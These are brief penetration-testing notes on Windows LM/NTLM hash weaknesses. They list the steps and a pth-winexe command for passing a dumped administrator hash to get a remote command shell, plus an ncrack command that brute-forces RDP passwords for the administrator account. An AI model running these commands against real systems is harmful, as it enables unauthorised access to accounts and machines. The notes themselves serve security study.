# LM hashes
- Password longer than 7 is split and each half hashed separately
- Passwords are converted into uppercase
- No salt
- Empty LM hash
```
AAD3B435B51404EE
AAD3B435B51404EEAAD3B435B51404EE
```
# NTLM hashes

# Dumping hashes

- Cannot copy SAM when sys is in use

# Pass the Hash

Auth using username and NTLM hash (since NTLM and LM hashes are not salted)

- Replace "no password" in dump wih empty LM hash
- Copy admins dumped hash (LM:NTML)
- export SMBHASH=LM:NTML
- pth-winexe -U administrator% //ip cmd

# RDP

```
ncrack -v -f --user administrator -P password.txt rdp://ip,CL=1
```
